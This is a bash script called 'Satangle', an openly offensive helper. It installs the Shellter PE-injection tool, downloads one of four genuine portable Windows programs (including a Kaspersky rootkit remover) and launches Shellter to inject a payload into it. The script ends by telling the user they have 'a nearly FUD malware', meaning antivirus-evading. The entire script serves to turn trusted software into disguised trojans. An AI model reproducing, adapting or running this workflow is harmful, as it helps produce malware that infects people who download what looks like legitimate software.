#!/bin/bash
echo -e "\e[0;49;31m                 ▄▄▄▓▓▓▓▓▓▄▄▄"
echo -e "\e[0;49;31m          ▀██▄▄▓▓▀▀▀   ░   ▀▀▀▓▓▄▄█▓▀"
echo -e "\e[0;49;31m           ▄███▄               ▄███▄"
echo -e "\e[0;49;31m         ▄▓▀ ▀▓██▄░          ▄██▓▀ ▀█▄"
echo -e "\e[0;49;31m        █▓░   ▀█▌▀▓█▄     ▄█▓▀▐█▀    ██"
echo -e "\e[0;49;31m       █▓▒     ▐█  ▀▓▓▓▄███▀░ ▓▌      ██"
echo -e "\e[0;49;31m      ▐█▌░      █▌  ▄█▓▀▓▓▄  ▐█       ▐█▌"
echo -e "\e[0;49;31m      ▓█        ▐█▄█▀ ▒   ▀█▄█▌        ▓█"
echo -e "\e[0;49;31m      ▓█      ▄▄███   ░     █▓▓▄▄     ░▓█"
echo -e "\e[0;49;31m      ▓█  ▄▄▓▓▀▀  ▓█       █▓  ▀▀▓▓▄▄░▒▓█"
echo -e "\e[0;49;31m      ▓████▀░░▄▄▄▄▄▓█▓▀▀▀▓█▓▄▄▄▄▄ ░▀██▓██"
echo -e "\e[0;49;31m  ▄▄██▀██▀▀▀▀▀▀     █▓░ ░▓█    ▀▀▀▀▀▀▀██▀██▄▄"
echo -e "\e[0;49;31m▀▀▀     █▓░         ▐▓░ ░▓▌          █▓     ▀▀▀"
echo -e "\e[0;49;31m         █▓░         █▌ ▐█          █▓"
echo -e "\e[0;49;31m          ▀▓▄        ▐█░█▌        ▄▓▀"
echo -e "\e[0;49;31m            ▀██▄▄     █▒█     ▄▄█▓▀"
echo -e "\e[0;49;31m               ▀▀▓▓▓▄▄█▓█▄▄▓▓▓▀▀"
echo -e "\e[0;49;31m                    ▀▀███▀▀"
echo -e "\e[0;49;31m                      ▐█▌"
echo -e "\e[0;49;31m                       ▓"
echo -e "\e[0;49;31m                       ▒"
echo -e "\e[0;49;31m                       ░"
echo ''
echo ' @@@@@@  @@@@@@  @@@@@@@  @@@@@@  @@@  @@@  @@@@@@@  @@@      @@@@@@@@'
echo '!@@     @@!  @@@   @!!   @@!  @@@ @@!@!@@@ !@@       @@!      @@!'
echo ' !@@!!  @!@!@!@!   @!!   @!@!@!@! @!@@!!@! !@! @!@!@ @!!      @!!!:!'
echo '    !:! !!:  !!!   !!:   !!:  !!! !!:  !!! :!!   !!: !!:      !!:'
echo '::.: :   :   : :    :     :   : : ::    :   :: :: :  : ::.: : : :: ::'
echo ''
echo ''
echo "This script requires Shellter and Wine, would you like to install Shellter now? Y\N"
echo "Satangle>> "
read installer_prompt
if [[ $installer_prompt = "N" ]]; then
  echo "Next we'll need a PE file to inject into. (You can Google the names if you'd like to know what you're injecting into)"
  echo "Choose one from below..."
  echo "1 = IsoToxin (Tested and working)"
  echo "2 = Kaspersky TDSSKiller Portable (Kek to the devs) (Not tested)"
  echo "3 = Don't Panic! Portable (For the lulz)"
  echo "4 = GPU-Z Portable (Tested and working)"
  echo "More coming soon..."
  echo "Satangle>> "
  read PE_choice
  if [[ $PE_choice = "1" ]]; then
    echo "Downloading and renaming the file. Name will be IsoToxinPortable.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Isotoxin%20Portable/IsotoxinPortable_0.4.503.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Finternet%2Fisotoxin-portable&ts=1488231161&use_mirror=superb-sea2" && mv "IsotoxinPortable_0.4.503.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Finternet%2Fisotoxin-portable&ts=1488231161&use_mirror=superb-sea2" "IsoToxinPortable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "2" ]]; then
    echo "Downloading and renaming the file. Name will be Kaspersky_TDSSKiller.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Kaspersky%20TDSSKiller%20Portable/KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Fsecurity%2Fkaspersky-tdsskiller-portable&ts=1488231694&use_mirror=cytranet" && mv "KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Fsecurity%2Fkaspersky-tdsskiller-portable&ts=1488231694&use_mirror=cytranet" "Kaspersky_TDSSKiller.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "3" ]]; then
    echo "Downloading and renaming the file. Name will be DontPanic.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Dont%20Panic%20Portable/DontPanicPortable_3.1.0.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Futilities%2Fdont_panic_portable&ts=1488231964&use_mirror=cytranet" && mv "DontPanicPortable_3.1.0.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Futilities%2Fdont_panic_portable&ts=1488231964&use_mirror=cytranet" "DontPanic.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "4" ]]; then
    echo "Downloading and renaming the file. Name will be GPU-Z_Portable.exe"
    wget -q "http://download3.portableapps.com/portableapps/gpu-zportable/GPU-ZPortable_1.17.0.paf.exe" && mv "GPU-ZPortable_1.17.0.paf.exe" "GPU-Z_Portable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
fi
if [[ $installer_prompt = "Y" ]]; then
  echo "Note: Wine will not be installed, you'll have to manually install it."
  wget "https://www.shellterproject.com/Downloads/Shellter/Latest/shellter_2.0-1_all.deb"
  mv "shellter_2.0-1_all.deb" "/tmp/shellter.deb"
  echo "Which installer do you wanna use?"
  echo "1 = gdebi"
  echo "2 = dpkg"
  echo "Satangle>> "
  read installer_prompt_2
  if [[ $installer_prompt_2 = "1" ]]; then
    apt-get update && apt-get install gdebi && gdebi "/tmp/shellter.deb"
  fi
  if [[ $installer_prompt_2 = "2" ]]; then
    dpkg -i "/tmp/shellter.deb"
  fi
  echo "Next we'll need a PE file to inject into. (You can Google the names if you'd like to know what you're injecting into)"
  echo "Choose one from below..."
  echo "1 = IsoToxin (Tested and working)"
  echo "2 = Kaspersky TDSSKiller Portable (Kek to the devs) (Not tested)"
  echo "3 = Don't Panic! Portable (For the lulz)"
  echo "4 = GPU-Z Portable (Tested and working)"
  echo "More coming soon..."
  echo "Satangle>> "
  read PE_choice
  if [[ $PE_choice = "1" ]]; then
    echo "Downloading and renaming the file. Name will be IsoToxinPortable.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Isotoxin%20Portable/IsotoxinPortable_0.4.503.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Finternet%2Fisotoxin-portable&ts=1488231161&use_mirror=superb-sea2" && mv "IsotoxinPortable_0.4.503.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Finternet%2Fisotoxin-portable&ts=1488231161&use_mirror=superb-sea2" "IsoToxinPortable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "2" ]]; then
    echo "Downloading and renaming the file. Name will be Kaspersky_TDSSKiller.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Kaspersky%20TDSSKiller%20Portable/KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Fsecurity%2Fkaspersky-tdsskiller-portable&ts=1488231694&use_mirror=cytranet" && mv "KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Fsecurity%2Fkaspersky-tdsskiller-portable&ts=1488231694&use_mirror=cytranet" "Kaspersky_TDSSKiller.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "3" ]]; then
    echo "Downloading and renaming the file. Name will be DontPanic.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Dont%20Panic%20Portable/DontPanicPortable_3.1.0.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Futilities%2Fdont_panic_portable&ts=1488231964&use_mirror=cytranet" && mv "DontPanicPortable_3.1.0.paf.exe?r=http%3A%2F%2Fportableapps.com%2Fapps%2Futilities%2Fdont_panic_portable&ts=1488231964&use_mirror=cytranet" "DontPanic.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "4" ]]; then
    echo "Downloading and renaming the file. Name will be GPU-Z_Portable.exe"
    wget -q "http://download3.portableapps.com/portableapps/gpu-zportable/GPU-ZPortable_1.17.0.paf.exe" && mv "GPU-ZPortable_1.17.0.paf.exe" "GPU-Z_Portable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 10 seconds...)"
    sleep 10
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
fi